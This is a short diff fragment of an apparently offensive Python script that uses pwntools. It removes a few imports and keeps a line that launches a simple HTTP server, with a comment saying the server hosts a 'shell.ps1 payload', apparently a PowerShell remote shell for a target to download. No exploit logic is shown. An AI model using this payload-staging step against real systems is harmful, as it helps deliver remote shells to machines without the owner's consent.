@@ -1,9 +1,5 @@
 from pwn import *
 import subprocess
-from threading import Thread
-from queue import Queue, Empty
-import time
-
 
 # Opens the server for the shell.ps1 payload
 http_server = subprocess.Popen(["python2", "-m", "SimpleHTTPServer"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
